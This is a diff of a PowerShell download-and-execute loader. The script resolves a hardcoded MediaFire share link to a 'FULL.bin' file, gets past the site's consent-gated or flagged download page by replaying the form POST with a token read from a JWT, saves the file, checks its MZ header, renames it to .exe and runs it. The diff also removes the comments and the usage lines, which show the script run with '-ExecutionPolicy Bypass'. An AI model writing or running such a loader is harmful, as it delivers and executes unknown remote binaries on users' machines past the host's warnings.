@@ -1,13 +1,3 @@
-<#
-Resolves a MediaFire SHARE page link (the /file/.../file kind, not a direct
-link) into the real download URL, saves it, checks the MZ header, renames to
-.exe and runs it. Non-MediaFire links (storage.to, straight file URLs) are
-downloaded as before.
-
-    powershell -ExecutionPolicy Bypass -File mf_loader.ps1 -FileName Setup
-    powershell -ExecutionPolicy Bypass -File mf_loader.ps1 -FileName Setup -NoLaunch
-    powershell -ExecutionPolicy Bypass -File mf_loader.ps1 -FileName Setup -Sha256 7598...
-#>
 param(
     [string]$Url = 'https://www.mediafire.com/file/w660dh97rs11skk/FULL.bin/file',
     [string]$FileName,
@@ -18,7 +8,6 @@ param(
 
 $DownloadUrl = $Url
 
-# Fall back to a random file name if none was supplied
 if ([string]::IsNullOrWhiteSpace($FileName)) {
     $FileName = [System.Guid]::NewGuid().ToString()
 }
@@ -44,8 +33,7 @@ function Get-LongestToken([string]$Html) {
 }
 
 function Get-JwtClaim([string]$Token, [string]$Name) {
-    # The download link is only released when the form POSTs back a value the
-    # token itself carries (bdpass), so read it out of the JWT payload.
+   
     try {
         $payload = ($Token -split '\.')[1]
         $payload = $payload.Replace('-', '+').Replace('_', '/')
@@ -80,13 +68,13 @@ function Resolve-MediaFireLink([string]$Link) {
         $page = "https://www.mediafire.com/file/$qkey/file"
     }
 
-    # Cookies matter: the token is signed for the session that received it.
+
     $html = (Invoke-WebRequest -Uri $page -UseBasicParsing -SessionVariable sess -Headers @{
             'User-Agent' = $script:UserAgent
             'Referer'    = 'https://www.mediafire.com/'
         }).Content
 
-    # Plain (unflagged) page already carries the link on the button.
+    
     $btn = [regex]::Match($html, 'id="downloadButton"[^>]*?href="([^"]+)"')
     if ($btn.Success) {
         return @{ Url = $btn.Groups[1].Value.Replace('&amp;', '&'); Name = Get-LinkName $page; Pass = $null; Session = $sess }
@@ -159,8 +147,7 @@ try {
         Write-Host "resolved -> $shown..."
     }
 
-    # Download file. A GET on a consent-gated MediaFire link is rejected
-    # (download_repair.php?flag=12), so replay the form POST the button sends.
+ 
     $dlParams = @{
         Uri             = $DownloadUrl
         OutFile         = $DownloadedFile
@@ -189,7 +176,7 @@ try {
         Write-Host 'sha256 ok'
     }
 
-    # Verify the file exists and has an EXE header
+    
     $Stream = [System.IO.File]::OpenRead($DownloadedFile)
     try {
         $Header = New-Object byte[] 2
@@ -205,7 +192,7 @@ try {
         throw 'Downloaded file is not a valid Windows EXE.'
     }
 
-    # Remove the .bin extension -> add .exe to the name
+
     Move-Item -LiteralPath $DownloadedFile -Destination $ExePath -Force
 
     if ($NoLaunch) {
@@ -213,7 +200,7 @@ try {
         $ExitCode = 0
     }
     else {
-        # Run with all remaining arguments supplied to this script
+       
         & $ExePath @RestArgs
         $ExitCode = $LASTEXITCODE
     }
@@ -223,5 +210,4 @@ catch {
     $ExitCode = 1
 }
 
-# Exit after the program finishes
 exit $ExitCode
